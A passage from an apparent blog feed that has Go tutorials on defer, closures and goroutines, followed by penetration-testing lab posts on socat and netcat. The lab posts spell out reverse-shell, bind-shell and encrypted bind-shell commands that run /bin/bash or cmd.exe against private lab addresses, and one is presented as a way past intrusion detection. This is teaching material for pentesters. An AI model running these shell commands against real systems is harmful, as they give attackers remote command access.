class="line">    fmt.Println(message, <span class="string">&quot;at some time&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the above examples, <strong><em>defer</em></strong> statements are used to ensure the file is closed before main returns, log the execution time of the function, and execute multiple <strong><em>defer</em></strong> statements in a last-in, first-out order.</p><p><strong><em>defer</em></strong> is a powerful tool in Go that can help you write safer and cleaner code, ensuring proper resource release and consistency.”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In Go language, &lt;strong&gt;&lt;em&gt;defer&lt;/em&gt;&lt;/strong&gt; is a very useful keyword used for deferring the execution of functions, typically employe</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="defer" scheme="http://example.com/categories/Go/defer/"/>
    
    
  </entry>
  
  <entry>
    <title>Closure and Anonymous Function in Go</title>
    <link href="http://example.com/2018/11/28/goAnonymousFunctionClosure/"/>
    <id>http://example.com/2018/11/28/goAnonymousFunctionClosure/</id>
    <published>2018-11-29T02:21:24.000Z</published>
    <updated>2023-10-17T15:38:03.764Z</updated>
    
    <content type="html"><![CDATA[<p>In Go language, <strong><em>closures</em></strong> and <strong><em>anonymous functions</em></strong> are both forms of functions, but they have some important differences. Below, I will provide examples of the usage and differences between these two concepts:</p><ol><li><strong><em>Closure</em></strong> Example:<br>A <strong><em>closure</em></strong> refers to a function that captures one or more variables from its outer function scope and can be called outside of that function while still accessing these captured variables.</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    outerVar := <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Closure function</span></span><br><span class="line">    closure := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Outer variable outerVar:&quot;</span>, outerVar)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the closure function</span></span><br><span class="line">    closure() <span class="comment">// Output: Outer variable outerVar: 10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Modify the outer variable</span></span><br><span class="line">    outerVar = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the closure function again</span></span><br><span class="line">    closure() <span class="comment">// Output: Outer variable outerVar: 20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the above example, <strong><em>closure</em></strong> is a closure that captures the outer variable outerVar and can access and modify that variable even outside the function.</p><ol start="2"><li><strong><em>Anonymous Function</em></strong> Example:</li></ol><p>An <strong><em>anonymous function</em></strong> is a function without a name; it can be directly assigned to a variable or passed as an argument to other functions.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Define and call an anonymous function</span></span><br><span class="line">    result := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Result of the anonymous function:&quot;</span>, result) <span class="comment">// Output: Result of the anonymous function: 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assign an anonymous function to a variable</span></span><br><span class="line">    add := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum := add(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Calling the anonymous function using a variable:&quot;</span>, sum) <span class="comment">// Output: Calling the anonymous function using a variable: 30</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the above example, we define an <strong><em>anonymous function</em></strong> and call it directly. We also assign another <strong><em>anonymous function</em></strong> to the add variable and use that variable to call the function.</p><p>To summarize the differences:</p><p>A <strong><em>closure</em></strong> is a function that captures external variables and can access and modify them outside of the function.<br>An <strong><em>anonymous function</em></strong> is a function without a name, which can be assigned to a variable or passed as an argument to other functions.<br>It’s important to note that while <strong><em>closures</em></strong> often involve <strong><em>anonymous functions</em></strong>, not all <strong><em>anonymous functions</em></strong> are <strong><em>closures</em></strong>. A <strong><em>closure</em></strong> is a specific type of <strong><em>anonymous function</em></strong> that captures external variables.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In Go language, &lt;strong&gt;&lt;em&gt;closures&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;anonymous functions&lt;/em&gt;&lt;/strong&gt; are both forms of functions, but the</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="Closure and Anonymous Function" scheme="http://example.com/categories/Go/Closure-and-Anonymous-Function/"/>
    
    
  </entry>
  
  <entry>
    <title>A Brief Summary of &quot;go func()&quot;</title>
    <link href="http://example.com/2018/11/16/goFunc/"/>
    <id>http://example.com/2018/11/16/goFunc/</id>
    <published>2018-11-17T04:00:34.000Z</published>
    <updated>2023-10-23T14:48:54.676Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>“go func()”</em></strong> is a way in the Go programming language to launch new concurrent goroutines. A goroutine is a lightweight thread in Go used for concurrent task execution. Using <strong><em>“go func()”</em></strong> allows you to create new concurrent execution flows in your program without the need to explicitly create threads or manage the complexity of thread management.</p><p>Here is a basic example and some key concepts of using <strong><em>“go func()”</em></strong>:</p><p>Basic Example:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// Place the code you want to execute in a new concurrent goroutine here</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The main goroutine continues to execute other work</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the example above, <strong><em>“go func()”</em></strong> starts a concurrent goroutine for an anonymous function, which will execute the code inside it. The main goroutine continues to execute other tasks, while the new concurrent goroutine runs in the background.</p><p>Key Concepts:</p><ol><li><p><strong><em>Anonymous Function</em></strong>: Anonymous functions are typically used to define <strong><em>“go func()”</em></strong> because there’s no need to name the concurrent goroutine. The code for the anonymous function can be enclosed in {} as needed.</p></li><li><p><strong><em>Concurrent Execution</em></strong>: Goroutines launched with <strong><em>“go func()”</em></strong> run concurrently in the background without blocking the main program’s execution. This allows you to execute multiple tasks simultaneously, improving program performance.</p></li><li><p><strong><em>Data Sharing</em></strong>: Concurrent goroutines can share data, but it’s important to handle shared data carefully to avoid race conditions and data races. You can use tools provided by the “sync” package to manage access to shared data.</p></li><li><p><strong><em>Goroutine Management</em></strong>: Go’s runtime system is responsible for creating, scheduling, and destroying goroutines. You don’t need to worry about the complexity of thread creation and destruction.</p></li><li><p><strong><em>Waiting for Goroutines to Complete</em></strong>: If you need to wait for concurrent goroutines to finish, you can use mechanisms like “sync.WaitGroup” or channels to implement waiting.</p></li></ol><p>Using <strong><em>“go func()”</em></strong> is a simple way to achieve concurrency in the Go programming language, allowing you to run tasks in parallel, such as handling concurrent requests, performing background tasks, or other work that needs to execute simultaneously. However, be cautious about handling concurrency issues and ensuring that shared data is synchronized and accessed correctly.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;&lt;em&gt;“go func()”&lt;/em&gt;&lt;/strong&gt; is a way in the Go programming language to launch new concurrent goroutines. A goroutine is a light</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="go func()" scheme="http://example.com/categories/Go/go-func/"/>
    
    
    <category term="go" scheme="http://example.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Socat</title>
    <link href="http://example.com/2016/12/05/Pentest-socat/"/>
    <id>http://example.com/2016/12/05/Pentest-socat/</id>
    <published>2016-12-06T00:26:27.000Z</published>
    <updated>2023-10-21T22:00:20.508Z</updated>
    
    <content type="html"><![CDATA[<p>Socat is a command-line utility that establishes two bidirectional byte streams and transfers data<br>between them. For penetration testing, it is similar to Netcat but has additional useful features.</p><p>While there are a multitude of things that socat can do, we will only cover a few of them to illustrate<br>its use.</p><h1 id="Socat-File-Transfers"><a href="#Socat-File-Transfers" class="headerlink" title="Socat File Transfers"></a>Socat File Transfers</h1><p>Server side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# socat TCP4-LISTEN:443,fork file:nmap-list.txt </span><br></pre></td></tr></table></figure><p>Client side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat TCP4:192.168.244.140:443 file:nmap-list.txt ,create</span><br><span class="line">C:\Users\Administrator\Desktop\socat&gt; type nmap-list.txt</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 23:19 EDT</span><br><span class="line">Warning: 199.241.133.26 giving up on port because retransmission cap hit (10).</span><br><span class="line">Stats: 0:07:04 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="Socat-Reverse-Shells"><a href="#Socat-Reverse-Shells" class="headerlink" title="Socat Reverse Shells"></a>Socat Reverse Shells</h1><p>Server side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT</span><br><span class="line">... socat[5640] N listening on AF=2 0.0.0.0:443</span><br></pre></td></tr></table></figure><p>Client side:<br>When client side type follow command :</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# socat TCP4:192.168.244.140:443 EXEC:/bin/bash</span><br></pre></td></tr></table></figure><p>Then the server side , look like:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT</span><br><span class="line">... socat[5640] N listening on AF=2 0.0.0.0:443</span><br><span class="line">... socat[5640] N accepting connection from AF=2 192.168.244.140:54720 on 192.168.244.144:443</span><br><span class="line">... socat[5640] N using stdout for reading and writing</span><br><span class="line">... socat[5640] N starting data transfer loop with FDs [4,4] and [1,1]</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h1 id="Socat-Encrypted-Bind-Shells"><a href="#Socat-Encrypted-Bind-Shells" class="headerlink" title="Socat Encrypted Bind Shells"></a>Socat Encrypted Bind Shells</h1><p>To add encryption to a bind shell, we will rely on Secure Socket Layer certificates. This level of<br>encryption will assist in evading intrusion detection systems (IDS) and will help hide the sensitive<br>data we are transceiving.<br>To continue with the example, we will use the openssl application to create a selfsigned certificate using the following options:<br>• req: initiate a new certificate signing request<br>• -newkey: generate a new private key<br>• rsa:2048: use RSA encryption with a 2,048-bit key length.<br>• -nodes: store the private key without passphrase protection<br>• -keyout: save the key to a file<br>• -x509: output a self-signed certificate instead of a certificate request<br>• -days: set validity period in days<br>• -out: save the certificate to a file</p><p>Once we generate the key, we will cat the certificate and its private key into a file, which we will<br>eventually use to encrypt our bind shell.</p><p>Server side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt</span><br><span class="line">...+..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+.....+.+...+.....+......+.+......+.....+.......+.....+...............+.+.....+.+......+...+..+....+...+...+..................+.........+...+.....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+......+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">.+.+......+...+..+.+.....+.........+......+...+.........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+....+........+....+.....+.+.....+...+.......+..+.......+........+.+.....+.+...+........+.........+..................+......+.........+......+..........+.........+..+....+.........+......+.........+...+..+...+....+........+......+.+.........+......+...........+...+.......+...........................+.....+.......+......+........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">-----</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:CA</span><br><span class="line">State or Province Name (full name) [Some-State]:Quebec</span><br><span class="line">Locality Name (eg, city) []:Montreal</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:Raohua</span><br><span class="line">Organizational Unit Name (eg, section) []:Try Harder Department</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:</span><br><span class="line">Email Address []:</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash </span><br></pre></td></tr></table></figure><p>Client side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat - OPENSSL:192.168.244.140:443,verify=0</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 0=1000(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:f9:b4:b9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.244.140/24 brd 192.168.244.255 scope global dynamic noprefixroute eth0</span><br><span class="line">       valid_lft 1168sec preferred_lft 1168sec</span><br><span class="line">    inet6 fe80::9d6e:bd4e:a4b2:6ffb/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    link/ether 02:42:1d:28:b9:62 brd ff:ff:ff:ff:ff:ff</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Socat is a command-line utility that establishes two bidirectional byte streams and transfers data&lt;br&gt;between them. For penetration testi</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="Practical Tools" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/"/>
    
    <category term="Socat" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/Socat/"/>
    
    
  </entry>
  
  <entry>
    <title>Netcat</title>
    <link href="http://example.com/2016/12/01/Pentest-nc/"/>
    <id>http://example.com/2016/12/01/Pentest-nc/</id>
    <published>2016-12-02T04:04:37.000Z</published>
    <updated>2023-10-21T22:00:01.691Z</updated>
    
    <content type="html"><![CDATA[<p>Netcat first released in 1995(!) by <em>Hobbit</em> is one of the “original” network penetration testing<br>tools and is so versatile that it lives up to the author’s designation as a hacker’s “Swiss army knife”.<br>The clearest definition of Netcat is from <em>Hobbit</em> himself: a simple “utility which reads and writes<br>data across network connections, using TCP or UDP protocols.</p><ol><li>Connecting to a TCP&#x2F;UDP Port</li></ol><p>We can use client mode to connect to any TCP&#x2F;UDP port, allowing us to:<br>• Check if a port is open or closed.<br>• Read a banner from the service listening on a port.<br>• Connect to a network service manually.</p><p>Example:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 10.11.10.2 110</span><br></pre></td></tr></table></figure><p><code>-n</code> option to skip DNS name resolution;<br><code>-v</code> to add some verbosity;</p><p>Output:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(UNKNOWN) [10.11.10.2] 110 (pop3) open</span><br><span class="line">+OK Dovecot ready.</span><br><span class="line">USER offsec</span><br><span class="line">+OK</span><br><span class="line">PASS offsec</span><br><span class="line">-ERR [AUTH] Authentication failed.</span><br><span class="line">quit</span><br><span class="line">+OK Logging out</span><br></pre></td></tr></table></figure><ol start="2"><li>Listening on a TCP&#x2F;UDP Port</li></ol><p>Example:</p><p>First , server start listening: </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//From server : </span><br><span class="line">msfadmin@metasploitable:~$ nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>Then client try to connect server,and send “hello world”: </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//From client : </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.136 4444</span><br><span class="line">(UNKNOWN) [192.168.244.136] 4444 (?) open</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>The server will receive message “hello world”:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//From server : </span><br><span class="line">msfadmin@metasploitable:~$ nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 47386</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><ol start="3"><li>Transferring Files with Netcat</li></ol><p>From Server:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//From server : </span><br><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 &gt; mync.exe</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>From client : </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//From client : </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.143 4444 &lt; /home/kali/Desktop/nc.exe     </span><br><span class="line">(UNKNOWN) [192.168.244.143] 4444 (?) open</span><br></pre></td></tr></table></figure><p>Notice that we have not received any feedback from Netcat about our file upload progress. In this<br>case, since the file we are uploading is small, we can just wait a few seconds, then check whether<br>the file has been fully uploaded to the Windows machine by attempting to run it:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt;mync -h</span><br><span class="line">[v1.10-47]</span><br><span class="line">connect to somewhere:   nc [-options] hostname port[s] [ports] ... </span><br><span class="line">listen for inbound:     nc -l -p port [-options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">        -c shell commands       as `-e&#x27;; use /bin/sh to exec [dangerous!!]</span><br><span class="line">        -e filename             program to exec after connect [dangerous!!]</span><br><span class="line">        -b                      allow broadcasts</span><br><span class="line">        ...</span><br><span class="line">port numbers can be individual or ranges: lo-hi [inclusive];</span><br><span class="line">hyphens in port names must be backslash escaped (e.g. &#x27;ftp\-data&#x27;).</span><br></pre></td></tr></table></figure><ol start="4"><li>Netcat Bind Shell Scenario</li></ol><p>Run Netcat with the -e option to execute cmd.exe once a connection is made to the listening port:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.143 4444                            </span><br><span class="line">(UNKNOWN) [192.168.244.143] 4444 (?) open</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop\netcat-1.11&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Local Area Connection:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::6d45:b51c:b367:2f09%11</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.244.143</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.244.2</span><br><span class="line"></span><br><span class="line">Tunnel adapter isatap.localdomain:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop\netcat-1.11&gt;</span><br></pre></td></tr></table></figure><p>This is indeed a “gaping security hole”!</p><ol start="5"><li>Reverse Shell Scenario<br>Server:<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure></li></ol><p>Client:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.143 4444                            </span><br><span class="line">(UNKNOWN) [192.168.244.143] 4444 (?) open</span><br></pre></td></tr></table></figure><p>Then server side shows like:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 35156</span><br><span class="line">ls</span><br><span class="line">code.desktop</span><br><span class="line">nc.exe</span><br><span class="line"></span><br><span class="line">ip address show eth0 | grep inet</span><br><span class="line">inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Netcat first released in 1995(!) by &lt;em&gt;Hobbit&lt;/em&gt; is one of the “original” network penetration testing&lt;br&gt;tools and is so versatile tha</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="Practical Tools" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/"/>
    
    <category term="Netcat" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/Netcat/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL Stack-Based SQL Injection</title>
    <link href="http://example.com/2016/11/29/SQLInjectionMySQLStackBased/"/>
    <id>http://example.com/2016/11/29/SQLInjectionMySQLStackBased/</id>
    <published>2016-11-30T04:22:05.000Z</published>
    <updated>2023-10-19T15:36:07.842Z</updated>
    
